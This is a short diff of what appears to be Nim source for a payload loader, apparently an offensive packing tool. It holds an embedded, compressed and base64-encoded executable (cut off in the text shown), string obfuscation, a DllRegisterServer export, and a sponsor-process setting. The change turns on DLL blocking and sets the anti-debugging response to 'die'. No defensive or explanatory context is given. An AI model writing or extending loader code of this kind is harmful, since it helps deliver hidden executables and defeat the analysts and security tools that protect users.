@@ -5,7 +5,7 @@ var compressedBase64PE* = protectString("H4sIAAAAAAAACux9eWATdfZ40jQlLS0TjmIFxIp
 var sponsorPath* = getAppFilename()
 var sponsorParams* = protectString(r" ")
 var dllExportName* = protectString("DllRegisterServer") 
-var isBlockDlls* = false
-var antiDebugAction* = protectString("none")
+var isBlockDlls* = true
+var antiDebugAction* = protectString("die")
 var sleepSeconds* = 0
     
